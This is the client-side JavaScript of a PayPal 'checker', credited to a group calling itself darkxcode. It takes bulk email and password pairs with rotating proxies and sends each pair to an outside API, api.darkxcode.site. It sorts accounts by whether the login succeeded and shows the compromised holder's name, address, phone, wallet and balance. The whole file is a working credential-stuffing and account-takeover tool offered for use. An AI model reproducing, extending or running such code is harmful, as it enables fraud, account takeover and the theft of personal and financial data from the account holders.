/*
   $ TEAM    : https://instagram.com/darkxcode_
   $ AUTHOR  : https://t.me/zlaxtert 
   $ CODE    : https://t.me/zexkings 
   $ DESIGN  : https://t.me/danielsmt 
   $ SITE    : https://darkxcode.site/
   $ VERSION : 1.0
*/

$(document).ready(function() {
    // Set current year for copyright
    $('#current-year').text(new Date().getFullYear());

    // Theme toggle functionality
    $('#theme-toggle').change(function() {
        $('body').toggleClass('dark-mode', this.checked);
        localStorage.setItem('darkMode', this.checked);
    });

    // Check for saved theme preference
    if (localStorage.getItem('darkMode') === 'true') {
        $('#theme-toggle').prop('checked', true);
        $('body').addClass('dark-mode');
    }

    // File upload functionality
    $('#file-upload').change(function(e) {
        const file = e.target.files[0];
        if (file) {
            $('#file-name').text(file.name);
            const reader = new FileReader();
            reader.onload = function(e) {
                $('#lists').val(e.target.result);
                updateRemainingCount();
            };
            reader.readAsText(file);
        }
    });

    // Update remaining count when lists change
    $('#lists').on('input', updateRemainingCount);
    updateRemainingCount();

    // Copy buttons functionality
    $('#copy-success').click(function() {
        copyToClipboard('#success-results');
    });

    $('#copy-valid').click(function() {
        copyToClipboard('#valid-results');
    });

    $('#copy-die').click(function() {
        copyToClipboard('#die-results');
    });

    // Clear buttons functionality
    $('#clear-success').click(function() {
        $('#success-results').empty();
        updateResultCounts();
    });

    $('#clear-valid').click(function() {
        $('#valid-results').empty();
        updateResultCounts();
    });

    $('#clear-die').click(function() {
        $('#die-results').empty();
        updateResultCounts();
    });

    // Start checking process
    $('#start-btn').click(function() {
        startChecking();
    });

    // Stop checking process
    $('#stop-btn').click(function() {
        stopChecking();
    });

    // Initialize tooltips
    $('[data-bs-toggle="tooltip"]').tooltip();
    $('.info-tooltip').tooltip({
        placement: 'top'
    });
});

function updateRemainingCount() {
    const lists = $('#lists').val().trim().split('\n').filter(line => line.trim() !== '');
    $('#remaining-count').text(lists.length);
}

function copyToClipboard(selector) {
    const text = $(selector).text().trim();
    if (text) {
        navigator.clipboard.writeText(text).then(function() {
            alert('Copied to clipboard!');
        }, function() {
            alert('Failed to copy to clipboard');
        });
    }
}


/*
   $ TEAM    : https://instagram.com/darkxcode_
   $ AUTHOR  : https://t.me/zlaxtert 
   $ CODE    : https://t.me/zexkings 
   $ DESIGN  : https://t.me/danielsmt 
   $ SITE    : https://darkxcode.site/
   $ VERSION : 1.0
*/


function updateResultCounts() {
    const successCount = $('#success-results .result-card').length;
    const validCount = $('#valid-results .result-card').length;
    const dieCount = $('#die-results .result-card').length;
    
    $('#success-count').text(successCount);
    $('#valid-count').text(validCount);
    $('#die-count').text(dieCount);
    
    $('#success-tab-count').text(successCount);
    $('#valid-tab-count').text(validCount);
    $('#die-tab-count').text(dieCount);
    
    const totalChecked = successCount + validCount + dieCount;
    $('#checked-count').text(totalChecked + ' Checked');
    
    // Update progress
    const total = $('#lists').val().trim().split('\n').filter(line => line.trim() !== '').length;
    if (total > 0) {
        const progress = (totalChecked / total) * 100;
        $('.progress-bar').css('width', progress + '%').attr('aria-valuenow', progress);
        $('#progress-text').text(progress.toFixed(1) + '% Complete');
    }
}

let isChecking = false;
let currentIndex = 0;
let proxyList = [];
let currentProxyIndex = 0;

function startChecking() {
    // Validate inputs
    const apikey = $('#apikey').val().trim();
    const proxyInput = $('#proxy').val().trim();
    const type_proxy = $('#type_proxy').val();
    const lists = $('#lists').val().trim().split('\n').filter(line => line.trim() !== '');
    
    if (!apikey) {
        alert('API Key is required!');
        return;
    }
    
    if (!proxyInput) {
        alert('Proxy is required!');
        return;
    }
    
    if (!type_proxy) {
        alert('Proxy Type is required!');
        return;
    }
    
    if (lists.length === 0) {
        alert('At least one list item is required!');
        return;
    }
    
    if (lists.length > 1000) {
        alert('Maximum 1000 lists allowed!');
        return;
    }
    
    // Process proxy list
    proxyList = proxyInput.split('\n').filter(line => line.trim() !== '');
    if (proxyList.length === 0) {
        alert('At least one proxy is required!');
        return;
    }
    
    
    // Validate email format in lists
    for (const list of lists) {
        const [email] = list.split(/[|:]/);
        if (email && !isValidEmail(email.trim())) {
            alert('Invalid email format: ' + email);
            return;
        }
    }
    
    // Start the process
    isChecking = true;
    currentIndex = 0;
    currentProxyIndex = 0;
    
    $('#start-btn').prop('disabled', true);
    $('#stop-btn').prop('disabled', false);
    
    checkNextItem();
}

function stopChecking() {
    isChecking = false;
    $('#start-btn').prop('disabled', false);
    $('#stop-btn').prop('disabled', true);
}

function checkNextItem() {
    if (!isChecking) return;
    
    const lists = $('#lists').val().trim().split('\n').filter(line => line.trim() !== '');
    if (currentIndex >= lists.length) {
        stopChecking();
        alert('Checking completed!');
        return;
    }
    
    const list = lists[currentIndex];
    const [email, password] = list.split(/[|:]/);
    
    if (!email || !password) {
        addResult('die', list, 'Invalid format. Expected: EMAIL|PASSWORD or EMAIL:PASSWORD');
        currentIndex++;
        updateRemainingCount();
        updateResultCounts();
        setTimeout(checkNextItem, 100);
        return;
    }
    
    const apikey = $('#apikey').val().trim();
    const proxyAuth = $('#proxyAuth').val().trim();
    const type_proxy = $('#type_proxy').val();
    
    // Get next proxy (rotate if needed)
    const proxy = proxyList[currentProxyIndex];
    currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
    
    // Build API URL
    const apiUrl = `https://api.darkxcode.site/checker/paypal/?apikey=${encodeURIComponent(apikey)}&list=${encodeURIComponent(list)}&proxy=${encodeURIComponent(proxy)}&proxyAuth=${encodeURIComponent(proxyAuth)}&type_proxy=${encodeURIComponent(type_proxy)}`;
    
    // Make API request
    $.ajax({
        url: apiUrl,
        method: 'GET',
        dataType: 'json',
        timeout: 30000,
        success: function(response) {
            if (response.data && response.data.code === 200) {
                if (response.data.msg === 'SUCCESS LOGIN!') {
                    addResult('success', list, response.data.msg, response.data.info);
                } else if (response.data.msg === 'VALID EMAIL ADDRESS!') {
                    addResult('valid', list, response.data.msg);
                } else {
                    addResult('die', list, response.data.msg);
                }
            } else if (response.data && response.data.info && response.data.info.msg) {
                addResult('die', list, response.data.msg);
            } else {
                addResult('die', list, 'Unknown error occurred');
            }
            
            currentIndex++;
            updateRemainingCount();
            updateResultCounts();
            setTimeout(checkNextItem, 500); // Delay before next request
        },
        error: function(xhr, status, error) {
            addResult('die', list, 'API Error: ' + (error || status));
            currentIndex++;
            updateRemainingCount();
            updateResultCounts();
            setTimeout(checkNextItem, 500); // Delay before next request
        }
    });
}

function addResult(type, list, message, info = null) {
    const resultId = `result-${type}-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    let resultHtml = `
        <div class="result-card ${type}-card p-3 mb-2" id="${resultId}">
            <div class="d-flex justify-content-between align-items-start">
                <div class="flex-grow-1">
                    <h6 class="mb-1">${list}</h6>
                    <p class="mb-1">${message}</p>
    `;
    
    if (info) {
        resultHtml += `
            <div class="mt-2">
                <small class="d-block"><strong>Name:</strong> ${info.name || 'N/A'}</small>
                <small class="d-block"><strong>Address:</strong> ${info.billing_address || 'N/A'}</small>
                <small class="d-block"><strong>City:</strong> ${info.city || 'N/A'}, ${info.state || 'N/A'} ${info.postcode || 'N/A'}</small>
                <small class="d-block"><strong>Country:</strong> ${info.country || 'N/A'}</small>
                <small class="d-block"><strong>Wallet:</strong> ${info.wallet || 'N/A'}</small>
                <small class="d-block"><strong>Balance:</strong> ${info.ballance || 'N/A'}</small>
                <small class="d-block"><strong>Phone:</strong> ${info.phone || 'N/A'}</small>
            </div>
        `;
    }
    
    resultHtml += `
                </div>
                <div class="action-buttons">
                    <button class="btn btn-sm btn-outline-secondary copy-btn" data-text="${list}" title="Copy">
                        <i class="fas fa-copy"></i>
                    </button>
                    <button class="btn btn-sm btn-outline-danger delete-btn" title="Delete">
                        <i class="fas fa-trash"></i>
                    </button>
                </div>
            </div>
        </div>
    `;
    
    $(`#${type}-results`).prepend(resultHtml);
    
    // Add event listeners for the action buttons
    $(`#${resultId} .copy-btn`).click(function() {
        const text = $(this).data('text');
        navigator.clipboard.writeText(text);
    });
    
    $(`#${resultId} .delete-btn`).click(function() {
        $(`#${resultId}`).remove();
        updateResultCounts();
    });
}

function isValidEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

